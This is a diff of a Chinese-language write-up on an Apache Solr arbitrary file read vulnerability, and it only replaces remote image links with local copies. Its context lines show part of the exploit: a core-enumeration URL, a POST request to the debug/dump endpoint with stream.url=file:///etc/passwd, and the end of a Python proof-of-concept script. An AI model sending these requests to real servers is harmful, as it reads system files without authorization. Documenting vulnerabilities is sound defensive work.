@@ -52,7 +52,7 @@ canonical: "Web安全/中间件/Apache Solr/Apache Solr 任意文件读取漏洞
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
+![](../../.resource/remote/565dff06de2c0571aa8634353d3ee48f34e22060ed81ae34dbacca97a9237278.gif)
 
 **一****：漏洞描述🐑**
 
@@ -66,7 +66,7 @@ Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情�
 
 **访问 Solr Admin 管理员页面**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOF9j6yibMKuhtuZ81sHwF9repsOjQ9RyxH4svkM9W0W3OXibOCicug9YgA/640?wx_fmt=png)
+![](../../.resource/remote/ade6fcb78d6cb1b25c8aebd04e1ad2160b46922252085f9fe1931df5fd704173.png)
 
 获取 core 的信息  
 
@@ -74,11 +74,11 @@ Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情�
 http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOWt9YsL9R1HqF3qDNJteR6FNO3AE63GkfoicDVFbuHDNrDMWH3RNSapw/640?wx_fmt=png)
+![](../../.resource/remote/3ea935971de2b0237af4a8c828c977222d4317f51fd6542a72b8b7486699abf7.png)
 
 发送请求
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOBBTefXg9M3svDricSaLmoIiaX65dEjaqA4yITsq0jVYaBQmUBQucHzNg/640?wx_fmt=png)
+![](../../.resource/remote/8b6529c9ce118f20c18281bd40e3bc4cb6d4b2da6919a4deb44d9cc4e3a88d63.png)
 
 请求包如下
 
@@ -102,7 +102,7 @@ Connection: close
 
 再进行文件读取
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOb3W7mQmffS7icTCrLfQoCgMqedPMgCRHe4eQkKBYMgtrhgia4tWsWuyQ/640?wx_fmt=png)
+![](../../.resource/remote/9c4b8bc5e59726512141a7fa8e81ff861e5d0042a1374a496dc3cbdd4a453b53.png)
 
 ```http
 POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
@@ -122,7 +122,7 @@ Connection: close
 stream.url=file:///etc/passwd
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrObxBTqjfYGrDiacc8ArfDx1cnZpd4vWKIsTxv82UzNIkwhcfUKQ5fiaxw/640?wx_fmt=png)
+![](../../.resource/remote/8213f32a539f3aaed9fd2192eb8f03d65d06ee9b7af189279dd9a3c9f5e9cc68.png)
 
 ```
 Curl请求为
@@ -216,7 +216,7 @@ if __name__ == '__main__':
         POC_3(target_url, core_name, File_name)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrO51iaBThiaQNJdFAHmUbiaqYgibMrQD79FUFd4OqmE7kzUibib4eDKYf9S0RQ/640?wx_fmt=png)
+![](../../.resource/remote/2196573707784cf746fc2d1c1bf6d93463586e2c41c22d6dc1f6aff034d8414a.png)
 
 **四:  参考文章🐋**
 --------------
